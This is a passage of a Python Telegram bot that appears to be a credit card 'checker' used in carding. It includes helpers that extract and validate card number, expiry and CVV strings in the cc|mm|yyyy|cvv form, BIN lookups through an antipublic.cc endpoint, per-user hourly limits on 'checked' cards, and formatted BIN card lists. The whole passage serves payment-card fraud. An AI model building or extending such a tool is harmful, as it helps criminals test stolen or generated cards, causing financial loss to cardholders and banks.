    return f"""<b>𝗕𝗜𝗡 ⇾</b> {bin_number}
<b>𝗔𝗺𝗼𝘂𝗻𝘁 ⇾</b> {len(cards)}

{card_list}

<b>𝗜𝗻𝗳𝗼:</b> {bin_info.get('brand', 'Unknown')} - {bin_info.get('type', 'Unknown')}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bin_info.get('bank', 'Unknown')}
<b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {bin_info.get('country_name', 'Unknown')} {bin_info.get('country_flag', '')}"""

def check_rate_limit(user_id, chat_id):
    now = time.time()
    user = user_data.setdefault(user_id, {
        'last_command': 0,
        'command_count': 0,
        'reset_time': now + 3600
    })
    
    if now > user['reset_time']:
        user['command_count'] = 0
        user['reset_time'] = now + 3600
    
    if now - user['last_command'] < FLOOD_WAIT:
        remaining = FLOOD_WAIT - int(now - user['last_command'])
        bot.send_message(chat_id, f"⚠️ Please wait {remaining} seconds before using another command.")
        return False
    
    if user['command_count'] >= MAX_CHECKS_PER_HOUR:
        remaining = int((user['reset_time'] - now) // 60)
        bot.send_message(chat_id, f"⚠️ You have checked all {MAX_CHECKS_PER_HOUR} cards in 1 hour. Come back in {remaining} minutes.")
        return False
    
    user['last_command'] = now
    user['command_count'] += 1
    return True

def validate_card_format(card_details):
    try:
        cc, mm, yyyy, cvv = card_details.split('|')
        return (
            len(cc) in (15, 16) and cc.isdigit() and
            len(mm) == 2 and mm.isdigit() and 1 <= int(mm) <= 12 and
            len(yyyy) in (2, 4) and yyyy.isdigit() and
            len(cvv) in (3, 4) and cvv.isdigit()
        )
    except ValueError:
        return False

def extract_card_details(text):
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', text)
    return match.group(0) if match else None

def get_bin_info(bin_number):
    try:
        response = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number}",
            timeout=5
        )
        return response.json() if response.status_code == 200 else {}
    except Exception:
        return {}

# Start the bot
logger.info("Bot is starting with new token and admin ID...")
logger.info(f"Admin ID: {ADMINS[0]}")
logger.info(f"Base API URL: {BASE_API_URL}")

if __name__ == "__main__":
    try:
        bot.delete_webhook()
        bot.infinity_polling()
    except Exception as e:
        logger.error(f"Bot error: {e}")
